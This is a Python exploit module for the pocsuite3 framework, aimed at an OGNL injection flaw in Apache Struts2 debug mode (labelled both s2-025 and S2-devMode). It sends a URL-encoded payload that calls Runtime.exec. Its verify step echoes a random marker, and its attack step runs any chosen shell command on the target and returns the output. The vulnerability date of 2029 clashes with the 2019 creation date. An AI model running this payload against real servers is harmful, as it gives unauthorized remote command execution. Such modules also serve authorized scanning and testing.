from collections import OrderedDict
from urllib.parse import quote

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests
from pocsuite3.lib.core.enums import VUL_TYPE
from pocsuite3.lib.core.interpreter_option import OptString
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['knownsec.com']
    vulDate = '2029-5-8'
    createDate = '2019-5-8'
    updateDate = '2019-5-8'
    references = ['https://cwiki.apache.org/confluence/display/WW/S2-025']
    name = 'Apache Struts2 s2-025'
    appPowerLink = ''
    appName = 'Apache Struts2'
    appVersion = 'Struts 2.0.0 - Struts Struts 2.3.16.3'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''S2-devMode:影响版本Struts 2.0.0 - Struts Struts 2.3.16.3'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    dockerfile = '''FROM isxiangyang/struts2-all-vul-pocsuite:latest'''

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString('', description="可执行的shell命令")
        return o

    def _verify(self):
        p = self._check()
        if p:
            return self.parse_output(p)

    def _check(self):
        result = {}
        headers = {
            "Content-Type": 'application/x-www-form-urlencoded'
        }
        exec_payload = "?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command={cmd}"
        flag = random_str(5)
        exec_payload = exec_payload.format(cmd=quote("echo {};".format(flag)))
        html = requests.get(self.url + exec_payload, headers=headers).text
        if flag in html:
            result["VerifyInfo"] = {
                "URL": self.url,
            }
            return result
        return False

    def _attack(self):
        p = self._check()
        result = {}
        if p:
            headers = {
                "Content-Type": 'application/x-www-form-urlencoded'
            }
            exec_payload = "?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command={cmd}"
            cmd = self.get_option("command")
            exec_payload = exec_payload.format(cmd=quote("{}".format(cmd)))
            html = requests.get(self.url + exec_payload, headers=headers).text
            if html:
                result["VerifyInfo"] = {
                    "result": html.replace("\x00", "").encode(),
                }
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
